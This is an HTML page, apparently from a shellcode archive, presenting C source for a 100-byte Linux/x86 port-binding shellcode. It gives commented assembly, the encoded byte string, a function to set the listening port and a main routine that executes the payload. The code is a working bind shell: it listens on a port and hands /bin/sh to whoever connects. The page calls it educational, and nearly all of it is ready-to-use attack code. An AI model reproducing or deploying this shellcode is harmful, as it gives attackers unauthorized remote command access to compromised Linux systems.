<html><head><title>Linux/x86 - SET_PORT() portbind - 100 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*---------------------------------------------------------------------------*
 *                 100 byte Portbind shellcode                               *
 *              by Benjamin Orozco - benoror@gmail.com                       *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-portbind.c                                         *
 * discription: x86-linux portbind shellcode.				     *
 *		Pretty big but excellent for educational purposes.	     *
 *		Use SET_PORT() before using the shellcode. Example:	     *
 *									     *
 *			SET_PORT(sc, 31337);			             *
 *									     *
 *___________________________________________________________________________*
 *---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*
 *				ASM Code	                             *
 *---------------------------------------------------------------------------*

# s = socket(2, 1, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x1			#
pop    %ebx			# socket() = 1
xor    %ecx,%ecx		#
push   %ecx			# 0
push   $0x1			# SOCK_STREAM = 1
push   $0x2			# AF_INET = 2
mov    %esp,%ecx		# Arguments
int    $0x80			# EXECUTE - Now %eax have the s fileDescriptor

# bind(s [2, 64713, 0], 0x10)
xor    %edx,%edx
push   %edx			# INADDR_ANY = 0
pushw  $0xc9fc			# PORT = 64713
pushw  $0x2			# AF_INET = 2
mov    %esp,%ecx		# %ecx holds server struct
push   $0x10			# sizeof(server) = 10
push   %ecx			# server struct
push   %eax			# s fileDescriptor
mov    %esp,%ecx
mov    %eax,%esi		# now %esi holds s fileDescriptor
push   $0x2			#
pop    %ebx			# bind() = 2
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# On success: %eax = 0

# listen(s, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x4			#
pop    %ebx			# listen() = 4
int    $0x80			# On success: %eax = 0

# c = accept(s, 0, 0)
xor    %ecx,%ecx
push   %ecx
push   %ecx
push   %esi			# %esi = s
mov    %esp,%ecx		# Arguments
push   $0x5			#
pop    %ebx			# accept() = 5
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# EXECUTE - Now %eax have c fileDescriptor

# dup2(c, 2) , dup2(c, 1) , dup2(c, 0)
xchg   %eax,%ebx        	# Put c fileDescriptor on %ebx [for dup2()]
push   $0x2
pop    %ecx
dup_loop:
mov    $0x3f,%al		# dup2() = 0x3f
int    $0x80
dec    %ecx
jns    dup_loop

# execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;,NULL])
mov    $0xb,%al			# execve = 11d
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %ebx
mov    %esp, %ecx
int    $0x80

*----------------------------------------------------------------------------*/

char sc[] =	
&quot;\x6a\x66&quot;                   	//push   $0x66
&quot;\x58&quot;                      	//pop    %eax
&quot;\x6a\x01&quot;                   	//push   $0x1
&quot;\x5b&quot;                      	//pop    %ebx
&quot;\x31\xc9&quot;                   	//xor    %ecx,%ecx
&quot;\x51&quot;                      	//push   %ecx
&quot;\x6a\x01&quot;                   	//push   $0x1
&quot;\x6a\x02&quot;                   	//push   $0x2
&quot;\x89\xe1&quot;                   	//mov    %esp,%ecx
&quot;\xcd\x80&quot;                   	//int    $0x80
&quot;\x31\xd2&quot;                   	//xor    %edx,%edx
&quot;\x52&quot;                      	//push   %edx
&quot;\x66\x68\xfc\xc9&quot;             	//pushw  $0xc9fc	//PORT
&quot;\x66\x6a\x02&quot;                	//pushw  $0x2
&quot;\x89\xe1&quot;                   	//mov    %esp,%ecx
&quot;\x6a\x10&quot;                   	//push   $0x10
&quot;\x51&quot;                      	//push   %ecx
&quot;\x50&quot;                      	//push   %eax
&quot;\x89\xe1&quot;                   	//mov    %esp,%ecx
&quot;\x89\xc6&quot;                   	//mov    %eax,%esi
&quot;\x6a\x02&quot;                   	//push   $0x2
&quot;\x5b&quot;                      	//pop    %ebx
&quot;\x6a\x66&quot;                   	//push   $0x66
&quot;\x58&quot;                      	//pop    %eax
&quot;\xcd\x80&quot;                   	//int    $0x80
&quot;\x6a\x66&quot;                   	//push   $0x66
&quot;\x58&quot;                      	//pop    %eax
&quot;\x6a\x04&quot;                   	//push   $0x4
&quot;\x5b&quot;                      	//pop    %ebx
&quot;\xcd\x80&quot;                   	//int    $0x80
&quot;\x31\xc9&quot;                   	//xor    %ecx,%ecx
&quot;\x51&quot;                      	//push   %ecx
&quot;\x51&quot;                      	//push   %ecx
&quot;\x56&quot;                      	//push   %esi
&quot;\x89\xe1&quot;                   	//mov    %esp,%ecx
&quot;\x6a\x05&quot;                   	//push   $0x5
&quot;\x5b&quot;                      	//pop    %ebx
&quot;\x6a\x66&quot;                   	//push   $0x66
&quot;\x58&quot;                      	//pop    %eax
&quot;\xcd\x80&quot;                   	//int    $0x80
&quot;\x93&quot;                      	//xchg   %eax,%ebx
&quot;\x6a\x02&quot;                   	//push   $0x2
&quot;\x59&quot;                      	//pop    %ecx
&quot;\xb0\x3f&quot;                   	//mov    $0x3f,%al
&quot;\xcd\x80&quot;                   	//int    $0x80
&quot;\x49&quot;                      	//dec    %ecx
&quot;\x79\xf9&quot;                   	//jns    48 &lt;dup_loop&gt;
&quot;\xb0\x0b&quot;                   	//mov    $0xb,%al
&quot;\x52&quot;                      	//push   %edx
&quot;\x68\x2f\x2f\x73\x68&quot;          //push   $0x68732f2f
&quot;\x68\x2f\x62\x69\x6e&quot;          //push   $0x6e69622f
&quot;\x89\xe3&quot;                   	//mov    %esp,%ebx
&quot;\x52&quot;                      	//push   %edx
&quot;\x53&quot;                      	//push   %ebx
&quot;\x89\xe1&quot;                   	//mov    %esp,%ecx
&quot;\xcd\x80&quot;;                   	//int    $0x80

void SET_PORT(char *buf, int port) {
	*(unsigned short *)(((buf)+22)) = (port);
	char tmp = buf[22];
	buf[22] = buf[23];
	buf[23] = tmp;
}

main(){
	printf(&quot;size: %d bytes\n&quot;, strlen(sc));
	
	SET_PORT(sc, 33333);
	__asm__(&quot;call sc&quot;);
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
